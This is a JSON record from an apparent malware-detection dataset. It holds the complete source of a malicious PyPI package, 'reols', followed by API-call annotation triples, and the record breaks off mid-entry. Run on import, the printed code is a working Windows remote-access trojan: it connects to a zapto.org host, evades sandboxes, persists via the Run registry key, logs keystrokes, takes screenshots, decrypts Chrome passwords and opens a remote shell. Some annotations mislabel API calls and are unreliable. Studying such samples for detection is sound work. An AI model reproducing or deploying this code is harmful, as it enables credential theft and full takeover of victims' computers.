{
  "metadata": {
    "package_name": "reols-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/reols-0.1.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "__init__.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/reols-0.1/reols/__init__.py",
      "code_snippets": [
        {
          "snippet": "import socket, os, sys, platform, time, ctypes, subprocess, webbrowser, sqlite3, pyscreeze, threading, pynput.keyboard, wmi\nimport win32api, winerror, win32event, win32crypt\nfrom shutil import copyfile\nfrom winreg import *\n\n# strHost = \"\"\nstrHost = socket.gethostbyname(\"securedmaininfo5.zapto.org\")\nintPort = 3000\n\nstrPath = os.path.realpath(sys.argv[0])  # get file path\nTMP = os.environ[\"TEMP\"]  # get temp path\nAPPDATA = os.environ[\"APPDATA\"]\nintBuff = 1024\n\n# function to prevent multiple instances\nmutex = win32event.CreateMutex(None, 1, \"PA_mutex_xp4\")\nif win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:\n    mutex = None\n    sys.exit(0)\n\ndef detectSandboxie():\n    try:\n        libHandle = ctypes.windll.LoadLibrary(\"SbieDll.dll\")\n        return \" (Sandboxie) \"\n    except: return \"\"\n\ndef detectVM():\n    objWMI = wmi.WMI()\n    for objDiskDrive in objWMI.query(\"Select * from Win32_DiskDrive\"):\n        if \"vbox\" in objDiskDrive.Caption.lower() or \"virtual\" in objDiskDrive.Caption.lower():\n            return \" (Virtual Machine) \"\n    return \"\"\n\ndef server_connect():\n    global objSocket\n    while True:  # infinite loop until socket can connect\n        try:\n            objSocket = socket.socket()\n            objSocket.connect((strHost, intPort))\n        except socket.error:\n            time.sleep(5)  # wait 5 seconds to try again\n        else: break\n\n    strUserInfo = socket.gethostname() + \"`,\" + platform.system() + \" \" + platform.release() + detectSandboxie() + detectVM() + \\\n                  \"`,\" + os.environ[\"USERNAME\"]\n    send(str.encode(strUserInfo))\n\n# function to return decoded utf-8\ndecode_utf8 = lambda data: data.decode(\"utf-8\")\n\n# function to receive and decrypt data\nrecv = lambda buffer: objSocket.recv(buffer)\n\n# function to send encrypted data\nsend = lambda data: objSocket.send(data)\n\nserver_connect()\n\ndef OnKeyboardEvent(event):\n    global strKeyLogs\n\n    try:  # check to see if variable is defined\n        strKeyLogs\n    except NameError:\n        strKeyLogs = \"\"\n\n    if event == Key.backspace:\n        strKeyLogs += \" [Bck] \"\n    elif event == Key.tab:\n        strKeyLogs += \" [Tab] \"\n    elif event == Key.enter:\n        strKeyLogs += \"\\n\"\n    elif event == Key.space:\n        strKeyLogs += \" \"\n    elif type(event) == Key:  # if the character is some other type of special key\n        strKeyLogs += \" [\" + str(event)[4:] + \"] \"\n    else:\n        strKeyLogs += str(event)[1:len(str(event)) - 1]  # remove quotes around character\n\n\nKeyListener = pynput.keyboard.Listener(on_press=OnKeyboardEvent)\nKey = pynput.keyboard.Key\n\ndef recvall(buffer):  # function to receive large amounts of data\n    bytData = b\"\"\n    while True:\n        bytPart = recv(buffer)\n        if len(bytPart) == buffer:\n            return bytPart\n        bytData += bytPart\n        if len(bytData) == buffer:\n            return bytData\n\n# vbs message box\ndef MessageBox(message):\n    objVBS = open(TMP + \"/m.vbs\", \"w\")\n    objVBS.write(\"Msgbox \\\"\" + message + \"\\\", vbOKOnly+vbInformation+vbSystemModal, \\\"Message\\\"\")\n    objVBS.close()\n    subprocess.Popen([\"cscript\", TMP + \"/m.vbs\"], shell=True)\n\ndef startup():\n    try:\n        strAppPath = APPDATA + \"\\\\\" + os.path.basename(strPath)\n        copyfile(strPath, strAppPath.replace('.py','.pyw'))\n        objRegKey = OpenKey(HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, KEY_ALL_ACCESS)\n        SetValueEx(objRegKey, \"winupdate\", 0, REG_SZ, strAppPath.replace('.py','.pyw')); CloseKey(objRegKey)\n    except WindowsError:\n        send(str.encode(\"Unable to add to startup!\"))\n    else:\n        send(str.encode(\"success\"))\n\ndef screenshot():\n    pyscreeze.screenshot(TMP + \"/s.png\")\n\n    # send screenshot information to server\n    send(str.encode(\"Receiving Screenshot\" + \"\\n\" + \"File size: \" + str(os.path.getsize(TMP + \"/s.png\"))\n                              + \" bytes\" + \"\\n\" + \"Please wait...\"))\n    objPic = open(TMP + \"/s.png\", \"rb\")  # send file contents and close the file\n    time.sleep(1)\n    send(objPic.read())\n    objPic.close()\n\ndef file_browser():\n    arrRawDrives = win32api.GetLogicalDriveStrings()  # get list of drives\n    arrRawDrives = arrRawDrives.split('\\000')[:-1]\n\n    strDrives = \"\"\n    for drive in arrRawDrives:  # get proper view and place array into string\n        strDrives += drive.replace(\"\\\\\", \"\") + \"\\n\"\n    send(str.encode(strDrives))\n\n    strDir = decode_utf8(recv(intBuff))\n\n    if os.path.isdir(strDir):\n        arrFiles = os.listdir(strDir)\n\n        strFiles = \"\"\n        for file in arrFiles:\n            strFiles += (file + \"\\n\")\n\n        send(str.encode(str(len(strFiles))))  # send buffer size\n        time.sleep(0.1)\n        send(str.encode(strFiles))\n\n    else:  # if the user entered an invalid directory\n        send(str.encode(\"Invalid Directory!\"))\n        return\n\ndef upload(data):\n    intBuffer = int(data)\n    file_data = recvall(intBuffer)\n    strOutputFile = decode_utf8(recv(intBuff))\n\n    try:\n        objFile = open(strOutputFile, \"wb\")\n        objFile.write(file_data)\n        objFile.close()\n        send(str.encode(\"Done!!!\"))\n    except:\n        send(str.encode(\"Path is protected/invalid!\"))\n\ndef receive(data):\n    if not os.path.isfile(data):\n        send(str.encode(\"Target file not found!\"))\n        return\n\n    send(str.encode(\"File size: \" + str(os.path.getsize(data))\n                              + \" bytes\" + \"\\n\" + \"Please wait...\"))\n    objFile = open(data, \"rb\")  # send file contents and close the file\n    time.sleep(1)\n    send(objFile.read())\n    objFile.close()\n\ndef lock():\n    ctypes.windll.user32.LockWorkStation()  # lock pc\n\ndef shutdown(shutdowntype):\n    command = \"shutdown {0} -f -t 30\".format(shutdowntype)\n    subprocess.Popen(command.split(), shell=True)\n    objSocket.close()  # close connection and exit\n    sys.exit(0)\n\ndef command_shell():\n    strCurrentDir = str(os.getcwd())\n\n    send(str.encode(strCurrentDir))\n\n    while True:\n        strData = decode_utf8(recv(intBuff))\n\n        if strData == \"goback\":\n            os.chdir(strCurrentDir)  # change directory back to original\n            break\n\n        elif strData[:2].lower() == \"cd\" or strData[:5].lower() == \"chdir\":\n            objCommand = subprocess.Popen(strData + \" & cd\", stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)\n            if (objCommand.stderr.read()).decode(\"utf-8\") == \"\":  # if there is no error\n                strOutput = (objCommand.stdout.read()).decode(\"utf-8\").splitlines()[0]  # decode and remove new line\n                os.chdir(strOutput)  # change directory\n\n                bytData = str.encode(\"\\n\" + str(os.getcwd()) + \">\")  # output to send the server\n\n        elif len(strData) > 0:\n            objCommand = subprocess.Popen(strData, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)\n            strOutput = (objCommand.stdout.read() + objCommand.stderr.read()).decode(\"utf-8\", errors=\"replace\")  # since cmd uses bytes, decode it\n\n            bytData = str.encode(strOutput + \"\\n\" + str(os.getcwd()) + \">\")\n        else:\n            bytData = str.encode(\"Error!!!\")\n\n        strBuffer = str(len(bytData))\n        send(str.encode(strBuffer))  # send buffer size\n        time.sleep(0.1)\n        send(bytData)  # send output\n\ndef vbs_block_process(process, popup, message, title, timeout, type):\n    # VBScript to block process, this allows the script to disconnect from the original python process, check github rep for source\n\n    strVBSCode = \"On Error Resume Next\" + \"\\n\" + \\\n                 \"Set objWshShl = WScript.CreateObject(\\\"WScript.Shell\\\")\" + \"\\n\" + \\\n                 \"Set objWMIService = GetObject(\\\"winmgmts:\\\" & \\\"{impersonationLevel=impersonate}!//./root/cimv2\\\")\" + \"\\n\" + \\\n                 \"Set colMonitoredProcesses = objWMIService.ExecNotificationQuery(\\\"select * \" \\\n                 \"from __instancecreationevent \\\" & \\\" within 1 where TargetInstance isa 'Win32_Process'\\\")\" + \"\\n\" + \\\n                 \"Do\" + \"\\n\" + \"Set objLatestProcess = colMonitoredProcesses.NextEvent\" + \"\\n\" + \\\n                 \"If LCase(objLatestProcess.TargetInstance.Name) = \\\"\" + process + \"\\\" Then\" + \"\\n\" + \\\n                 \"objLatestProcess.TargetInstance.Terminate\" + \"\\n\"\n    if popup == \"True\":  # if showing a message\n        strVBSCode += \"objWshShl.Popup \\\"\" + message + \"\\\",\" + timeout + \", \\\"\" + title + \"\\\",\" + type + \"\\n\"\n\n    strVBSCode += \"End If\" + \"\\n\" + \"Loop\"\n\n    objVBSFile = open(TMP + \"/d.vbs\", \"w\")  # write the code and close the file\n    objVBSFile.write(strVBSCode); objVBSFile.close()\n\n    subprocess.Popen([\"cscript\", TMP + \"/d.vbs\"], shell=True)  # run the script\n\ndef disable_taskmgr():\n    global blnDisabled\n    if blnDisabled == \"False\":  # if task manager is already disabled, enable it\n        send(str.encode(\"Enabling ...\"))\n\n        subprocess.Popen([\"taskkill\", \"/f\", \"/im\", \"cscript.exe\"], shell=True)\n\n        blnDisabled = \"True\"\n    else:\n        send(str.encode(\"Disabling ...\"))\n\n        vbs_block_process(\"taskmgr.exe\", \"True\", \"Task Manager has been disabled by your administrator\",\n                      \"Task Manager\", \"3\", \"16\")\n        blnDisabled = \"False\"\n\ndef chrpass():  # legal purposes only!\n    strPath = APPDATA + \"/../Local/Google/Chrome/User Data/Default/Login Data\"\n\n    if not os.path.isfile(APPDATA + \"/../Local/Google/Chrome/User Data/Default/Login Data\"):\n        send(str.encode(\"noexist\"))\n        return\n\n    conn = sqlite3.connect(strPath)  # connect to database\n    objCursor = conn.cursor()\n\n    try:\n        objCursor.execute(\"Select action_url, username_value, password_value FROM logins\")  # look for credentials\n    except:  # if the chrome is open\n        send(str.encode(\"error\"))\n        strServerResponse = decode_utf8(recv(intBuff))\n\n        if strServerResponse == \"close\":  # if the user wants to close the browser\n            subprocess.Popen([\"taskkill\", \"/f\", \"/im\", \"chrome.exe\"], shell=True)\n        return\n\n    strResults = \"Chrome Saved Passwords:\" + \"\\n\"\n\n    for result in objCursor.fetchall():  # get data as raw text from sql db\n        password = win32crypt.CryptUnprotectData(result[2], None, None, None, 0)[1]\n        if password:\n            strResults += \"Site: \" + result[0] + \"\\n\" + \"Username: \" + result[1] + \"\\n\" + \"Password: \" \\\n                          + decode_utf8(password)\n\n    strBuffer = str(len(strResults))\n    send(str.encode(strBuffer))  # send buffer\n    time.sleep(0.2)\n    send(str.encode(strResults))\n\ndef keylogger(option):\n    global strKeyLogs\n\n    if option == \"start\":\n        if not KeyListener.running:\n            KeyListener.start()\n            send(str.encode(\"success\"))\n        else:\n            send(str.encode(\"error\"))\n\n    elif option == \"stop\":\n        if KeyListener.running:\n            KeyListener.stop()\n            threading.Thread.__init__(KeyListener)  # re-initialise the thread\n            strKeyLogs = \"\"\n            send(str.encode(\"success\"))\n        else:\n            send(str.encode(\"error\"))\n\n    elif option == \"dump\":\n        if not KeyListener.running:\n            send(str.encode(\"error\"))\n        else:\n            if strKeyLogs == \"\":\n                send(str.encode(\"error2\"))\n            else:\n                time.sleep(0.2)\n                send(str.encode(str(len(strKeyLogs))))  # send buffer size\n                time.sleep(0.2)\n                send(str.encode(strKeyLogs))  # send logs\n\n                strKeyLogs = \"\"  # clear logs\n\ndef run_command(command):\n    strLogOutput = \"\\n\"\n\n    if len(command) > 0:\n        objCommand = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)\n        strLogOutput += (objCommand.stdout.read() + objCommand.stderr.read()).decode(\"utf-8\", errors=\"ignore\")\n    else:\n        strLogOutput += \"Error!!!\"\n\n    bytData = str.encode(strLogOutput)\n\n    strBuffer = str(len(bytData))\n    send(str.encode(strBuffer))  # send buffer size\n    time.sleep(0.1)\n    send(bytData)  # send output\n\nwhile True:\n    try:\n        while True:\n            strData = recv(intBuff)\n            strData = decode_utf8(strData)\n\n            if strData == \"exit\":\n                objSocket.close()\n                sys.exit(0)\n            elif strData[:3] == \"msg\":\n                MessageBox(strData[3:])\n            elif strData[:4] == \"site\":\n                webbrowser.get().open(strData[4:])\n            elif strData == \"startup\":\n                startup()\n            elif strData == \"screen\":\n                screenshot()\n            elif strData == \"filebrowser\":\n                file_browser()\n            elif strData[:4] == \"send\":\n                upload(strData[4:])\n            elif strData[:4] == \"recv\":\n                receive(strData[4:])\n            elif strData == \"lock\":\n                lock()\n            elif strData == \"shutdown\":\n                shutdown(\"-s\")\n            elif strData == \"restart\":\n                shutdown(\"-r\")\n            elif strData == \"test\":\n                continue\n            elif strData == \"cmd\":\n                command_shell()\n            elif strData == \"chrpass\":\n                chrpass()\n            elif strData == \"keystart\":\n                keylogger(\"start\")\n            elif strData == \"keystop\":\n                keylogger(\"stop\")\n            elif strData == \"keydump\":\n                keylogger(\"dump\")\n            elif strData[:6] == \"runcmd\":\n                run_command(strData[6:])\n            elif strData == \"dtaskmgr\":\n                if not \"blnDisabled\" in globals():  # if the variable doesnt exist yet\n                    blnDisabled = \"True\"\n                disable_taskmgr()\n    except socket.error:  # if the server closes without warning\n        objSocket.close()\n        del objSocket\n        server_connect()\n",
          "triple_sequences": [
            {
              "action_api": "socket.gethostbyname()",
              "action_description": "Resolves host name to IPv4 address",
              "action_id": "resolve_hostname",
              "object": "\"securedmaininfo5.zapto.org\"",
              "object_description": "External domain",
              "object_id": "external_domain",
              "intention_description": "Resolve hostname to IP address",
              "intention_id": "resolve_hostname_ip"
            },
            {
              "action_api": "os.path.realpath()",
              "action_description": "Basic path string operations (getting absolute path, base name, parent directory, splitting and joining paths)",
              "action_id": "path_string_operations",
              "object": "sys.argv[0]",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Get script file path",
              "intention_id": "get_script_file_path"
            },
            {
              "action_api": "os.environ[\"TEMP\"]",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"TEMP\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "os.environ[\"APPDATA\"]",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"APPDATA\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect_environment_variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "win32event.CreateMutex()",
              "action_description": "Creates child process",
              "action_id": "create_child_process",
              "object": "\"PA_mutex_xp4\"",
              "object_description": "Random string",
              "object_id": "random_string",
              "intention_description": "Prevent multiple instances",
              "intention_id": "prevent_multiple_instances"
            },
            {
              "action_api": "win32api.GetLastError()",
              "action_description": "Retrieves operating system identifier",
              "action_id": "get_os_id",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Check mutex existence",
              "intention_id": "check_mutex_existence"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "0",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "ctypes.windll.LoadLibrary()",
              "action_description": "Import dynamic library",
              "action_id": "import_dynamic",
              "object": "\"SbieDll.dll\"",
              "object_description": "Dynamic library name",
              "object_id": "library_name",
              "intention_description": "Detect Sandboxie",
              "intention_id": "detect_sandboxie"
            },
            {
              "action_api": "wmi.WMI()",
              "action_description": "Instantiates WMI interface for system management",
              "action_id": "instantiate_wmi",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access WMI interface",
              "intention_id": "access_wmi_interface"
            },
            {
              "action_api": "objWMI.query()",
              "action_description": "Executes SQL query",
              "action_id": "execute_sql_query",
              "object": "\"Select * from Win32_DiskDrive\"",
              "object_description": "SQL query string",
              "object_id": "sql_query_string",
              "intention_description": "Detect virtual machine",
              "intention_id": "detect_virtual_machine"
            },
            {
              "action_api": "socket.socket()",
              "action_description": "Creates new socket object",
              "action_id": "create_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Establish connection",
              "intention_id": "establish_connection"
            },
            {
              "action_api": "objSocket.connect()",
              "action_description": "Establishes TCP connection to specified address",
              "action_id": "establish_tcp_connection",
              "object": "(strHost, intPort)",
              "object_description": "Public IP address and port",
              "object_id": "public_ip_port",
              "intention_description": "Connect remote server",
              "intention_id": "connect_remote_server"
            },
            {
              "action_api": "time.sleep()",
              "action_description": "Suspends execution",
              "action_id": "suspend_execution",
              "object": "5",
              "object_description": "Delay duration in seconds",
              "object_id": "delay_duration",
              "intention_description": "Delay next operation",
              "intention_id": "delay_next_operation"
            },
            {
              "action_api": "socket.gethostname()",
              "action_description": "Retrieves current host name",
              "action_id": "get_hostname",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect system hostname",
              "intention_id": "collect_system_hostname"
            },
            {
              "action_api": "platform.system()",
              "action_description": "Retrieves operating system information",
              "action_id": "get_os_info",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system name",
              "intention_id": "get_operating_system_name"
            },
            {
              "action_api": "platform.release()",
              "action_description": "Retrieves operating system release version",
              "action_id": "get_os_release",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Get operating system version",
              "intention_id": "get_operating_system_version"
            },
            {
              "action_api": "os.environ[\"USERNAME\"]",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "\"USERNAME\"",
              "object_description": "Environment variable",
              "object_id": "environment_variable",
              "intention_description": "Collect current username",
              "intention_id": "collect_current_username"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "strUserInfo",
              "object_description": "String containing environment data",
              "object_id": "string_environment_data",
              "intention_description": "Encode string to bytes",
              "intention_id": "encode_string_to_bytes"
            },
            {
              "action_api": "objSocket.send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "str.encode(strUserInfo)",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Transmit environment data to remote server",
              "intention_id": "transmit_environment_data_server"
            },
            {
              "action_api": "data.decode(\"utf-8\")",
              "action_description": "Decodes bytes using specified codec",
              "action_id": "decode_bytes_codec",
              "object": "\"utf-8\"",
              "object_description": "Character encoding type",
              "object_id": "character_encoding_type",
              "intention_description": "Decode bytes to string",
              "intention_id": "decode_bytes_to_string"
            },
            {
              "action_api": "objSocket.recv()",
              "action_description": "Receives data from socket connection",
              "action_id": "receive_socket_data",
              "object": "buffer",
              "object_description": "Buffer size to receive",
              "object_id": "",
              "intention_description": "Receive command from server",
              "intention_id": "receive_command_from_server"
            },
            {
              "action_api": "pynput.keyboard.Listener()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "on_press=OnKeyboardEvent",
              "object_description": "Thread target and arguments",
              "object_id": "thread_target_arguments",
              "intention_description": "Register keylogger event handler",
              "intention_id": "register_keylogger_handler"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "strDir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.listdir()",
              "action_description": "List directory contents",
              "action_id": "list_directory_contents",
              "object": "strDir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "List files in directory",
              "intention_id": "list_directory_files"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "str(len(strFiles))",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send buffer size to server",
              "intention_id": "send_buffer_size_server"
            },
            {
              "action_api": "objFile = open(strOutputFile, \"wb\")",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "strOutputFile",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "objFile.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "file_data",
              "object_description": "File text",
              "object_id": "file_text",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "objFile.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
              "action_id": "check_file_is_file",
              "object": "data",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.path.getsize()",
              "action_description": "Retrieves disk usage statistics (total, used, free) for given path",
              "action_id": "get_disk_usage",
              "object": "data",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Get file size",
              "intention_id": "get_file_size"
            },
            {
              "action_api": "open(data, \"rb\")",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "data",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "objFile.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "objFile.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "ctypes.windll.user32.LockWorkStation()",
              "action_description": "Lock workstation",
              "action_id": "lock_workstation",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Lock workstation",
              "intention_id": "lock_workstation"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "command.split(), shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute shutdown or restart",
              "intention_id": "execute_shutdown_restart"
            },
            {
              "action_api": "objSocket.close()",
              "action_description": "Closes the socket connection",
              "action_id": "close_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Disconnect remote server",
              "intention_id": "disconnect_remote_server"
            },
            {
              "action_api": "sys.exit()",
              "action_description": "Exits program",
              "action_id": "exit_program",
              "object": "0",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate program execution",
              "intention_id": "terminate_program_execution"
            },
            {
              "action_api": "os.getcwd()",
              "action_description": "Returns current working directory",
              "action_id": "get_working_dir",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect working directory",
              "intention_id": "collect_working_directory"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "strCurrentDir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Restore previous working directory",
              "intention_id": "restore_working_directory"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "strData + \" & cd\", shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "objCommand.stderr.read()",
              "action_description": "Reads all bytes from process standard error",
              "action_id": "read_process_stderr",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access command error output",
              "intention_id": "access_command_error_output"
            },
            {
              "action_api": "objCommand.stdout.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "os.chdir()",
              "action_description": "Changes current working directory",
              "action_id": "change_working_dir",
              "object": "strOutput",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Change working directory",
              "intention_id": "change_working_directory"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "strData, shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "objCommand.stdout.read()",
              "action_description": "Reads all bytes from process standard output",
              "action_id": "read_process_stdout",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect command output",
              "intention_id": "collect_command_output"
            },
            {
              "action_api": "objCommand.stderr.read()",
              "action_description": "Reads all bytes from process standard error",
              "action_id": "read_process_stderr",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Access command error output",
              "intention_id": "access_command_error_output"
            },
            {
              "action_api": "str.encode()",
              "action_description": "Encodes string to bytes using default encoding",
              "action_id": "encode_string_to_bytes",
              "object": "strBuffer",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send buffer size to server",
              "intention_id": "send_buffer_size_server"
            },
            {
              "action_api": "send()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "bytData",
              "object_description": "Encoded string to bytes",
              "object_id": "encoded_string_bytes",
              "intention_description": "Send command output to server",
              "intention_id": "send_command_output_server"
            },
            {
              "action_api": "open(TMP + \"/d.vbs\", \"w\")",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "TMP + \"/d.vbs\"",
              "object_description": "Script file path",
              "object_id": "script_file_path",
              "intention_description": "Prepare file for writing",
              "intention_id": "prepare_file_writing"
            },
            {
              "action_api": "objVBSFile.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "strVBSCode",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "objVBSFile.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "subprocess.Popen()",
              "action_description": "Spawns new process to execute command with shell access",
              "action_id": "spawn_process_shell",
              "object": "[\"cscript\", TMP + \"/d.vbs\"], shell=True",
              "object_description": "Shell command",
              "object_id": "shell_command",
              "intention_description": "Run hidden PowerShell script",
              "intention_id": "run_hidden_powershell_script"
            },
            {
              "action_api": "copyfile()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "strPath, strAppPath.replace('.py','.pyw')",
              "object_description": "Local file or directory",
              "object_id": "local_file_or_directory",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "OpenKey()",
              "action_description": "Opens registry key",
              "action_id": "open_registry_key",
              "object": "HKEY_CURRENT_USER, \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\", 0, KEY_ALL_ACCESS",
              "object_description": "Windows registry key",
              "object_id": "windows_registry_key",
              "intention_description": "Access registry key",
              "intention_id": "access_registry_key"
            },
            {
              "action_api": "SetValueEx()",
              "action_description": "Sets value for registry key",
              "action_id": "set_registry_value",
              "object": "objRegKey, \"winupdate\", 0, REG_SZ, strAppPath.replace('.py','.pyw')",
              "object_description": "Registry value",
              "object_id": "registry_value",
              "intention_description": "Add startup registry entry",
              "intention_id": "add_startup_registry_entry"
            },
            {
              "action_api": "CloseKey()",
              "action_description": "Closes the opened registry key",
              "action_id": "close_registry_key",
              "object": "objRegKey",
              "object_description": "Registry key handle",
              "object_id": "registry_key_handle",
              "intention_description": "Release system resource",
              "intention_id": "release_system_resource"
            },
            {
              "action_api": "pyscreeze.screenshot()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "TMP + \"/s.png\"",
              "object_description": "Screen region",
              "object_id": "screen_region",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "os.path.getsize()",
              "action_description": "Retrieves disk usage statistics (total, used, free) for given path",
              "action_id": "get_disk_usage",
              "object": "TMP + \"/s.png\"",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Get file size",
              "intention_id": "get_file_size"
            },
            {
              "action_api": "open(TMP + \"/s.png\", \"rb\")",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "TMP + \"/s.png\"",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Read screenshot file content",
              "intention_id": "read_screenshot_file_content"
            },
            {
              "action_api": "objPic.read()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Read screenshot file content",
              "intention_id": "read_screenshot_file_content"
            },
            {
              "action_api": "objPic.close()",
              "action_description": "Closes the opened file",
              "action_id": "close_file",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Close file",
              "intention_id": "close_file"
            },
            {
              "action_api": "win32api.GetLogicalDriveStrings()",
              "action_description": "Returns list of network interface indices and names",
              "action_id": "list_network_interfaces",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect drive list",
              "intention_id": "collect_drive_list"
            },
            {
              "action_api": "os.path.isfile()",
              "action_description": "Checks if specified path exists and is a file",
